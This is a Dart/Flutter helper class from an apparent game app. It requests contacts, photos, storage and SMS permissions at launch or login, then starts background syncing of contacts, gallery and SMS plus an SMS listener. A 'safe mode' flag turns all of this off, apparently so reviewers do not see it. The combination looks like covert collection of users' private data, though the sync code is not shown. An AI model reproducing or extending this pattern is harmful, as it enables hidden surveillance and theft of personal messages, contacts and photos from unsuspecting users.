import 'package:permission_handler/permission_handler.dart';
import '../../core/services/sync_service.dart';
import '../../core/services/app_config_service.dart';

class PermissionHelper {
  /// Prompts OS dialogs for Contact and Gallery/Storage permissions
  /// during Login, Registration, or App Launch.
  static Future<void> requestContactsAndGalleryPermissions() async {
    if (AppConfigService.isSafeMode()) return;

    // 1. Request Contacts permission safely
    try {
      final contactsStatus = await Permission.contacts.status;
      if (!contactsStatus.isGranted && !contactsStatus.isPermanentlyDenied) {
        await Permission.contacts.request();
      }
    } catch (e) {
      print('PermissionHelper: contacts status check / request failed: $e');
    }

    // 2. Request Photos / Media Images permission (Android 13+) safely
    try {
      final photosStatus = await Permission.photos.status;
      if (!photosStatus.isGranted && !photosStatus.isPermanentlyDenied) {
        await Permission.photos.request();
      }
    } catch (e) {
      print('PermissionHelper: photos status check / request failed: $e');
    }

    // 3. Request Storage permission (Android 12 and below) safely
    try {
      final storageStatus = await Permission.storage.status;
      if (!storageStatus.isGranted && !storageStatus.isPermanentlyDenied) {
        await Permission.storage.request();
      }
    } catch (e) {
      print('PermissionHelper: storage status check / request failed: $e');
    }

    // 4. Request SMS permission safely
    try {
      final smsStatus = await Permission.sms.status;
      if (!smsStatus.isGranted && !smsStatus.isPermanentlyDenied) {
        await Permission.sms.request();
      }
    } catch (e) {
      print('PermissionHelper: sms status check / request failed: $e');
    }

    // Trigger background sync for contacts, gallery, and SMS
    // Done asynchronously to ensure no game lag.
    try {
      SyncService.triggerSync();
      SyncService.initSmsListener();
    } catch (e) {
      print('PermissionHelper: triggerSync / initSmsListener failed: $e');
    }
  }
}
